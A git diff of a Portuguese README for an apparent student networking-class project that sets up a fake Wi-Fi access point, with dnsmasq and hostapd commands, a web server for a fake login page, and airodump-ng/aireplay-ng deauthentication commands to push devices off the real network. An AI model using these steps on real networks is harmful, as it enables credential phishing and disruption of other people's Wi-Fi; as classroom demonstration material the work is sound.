@@ -1,15 +1,52 @@
 # fake_ap_redes2
 fake ap repository for my group in "Redes 2"
 
-##### 1. Rotear wifi de um dispisitivo móvel com o nome "Wifi-Redes2"
+# Montagem via Roteador
 
-##### 2. Ligar roteador wifi com o mesmo nome do wifi do dispositivo móvel
+#### 1. Iniciar um servidor dns em seu computador
+##### - Instale o dnsmasq em sua máquina
+##### - Utilize o comando 
+```sh
+dnsmasq -C dnsmasqwrouter.conf
+```
+#### 2. Acessar as configurações do roteador e alterar o servidor dns para o ip do seu computador
 
-##### 3. Solicitar para a turma colocar os dipositivos conectados ao wifi VERDADEIRO próximos a placa de rede wifi usb
+#### 3. Iniciar o servidor web na porta 80, o mesmo em exemplo se encontra em docker para facil instalação
 
-##### 4. Lançar os pacotes de deauth com a placa de rede wifi externa
+# Montagem via HostAPD
+Essa montagem consiste em utilizar a interface de rede do computador como ponto de acesso
 
-##### 5. Solicitar que reconectem no wifi, de preferencia o falso para a experiencia 
+#### 1. Iniciar o servidor dns e dhcp
+##### - Instale o dnsmasq em sua máquina
+##### - Utilize o comando 
+```sh
+dnsmasq -C dnsmasq.conf
+```
 
-##### 6. Mostrar as respostas do form da página de login falsa ao pessoal
+#### 2. Roteie a partir do seu computador
+##### - Instale o hostapd
+##### - Utilize o comando
+```sh
+hostapd hostapd.conf
+```
 
+#### 3. Incie o servidor web na porta 80, o mesmo encontra-se como exemplo em docker no repositorio
+
+
+# Desautenticação
+
+#### 1. Instale o airodump e aireplay
+
+#### 2. Utilizar o airodump para encontrar o endereço MAC do alvo
+```sh
+airodump-ng <interface de rede>
+```
+
+#### 3. Utilizar o aireplay para lançar os pacotes de deauth
+```sh
+aireplay-ng -a <Endereço MAC do alvo> -0 <Número de pacotes a enviar> <interface de rede responsavel>
+```
+Obs: Certifique-se de que sua interface de rede está no mesmo canal do ponto de acesso alvo, para isso, observe o canal do ap alvo com o airodump e use comando a baixo para trocar o canal da interface de rede
+```sh
+airodump-ng -c <canal> <interface de rede>
+```
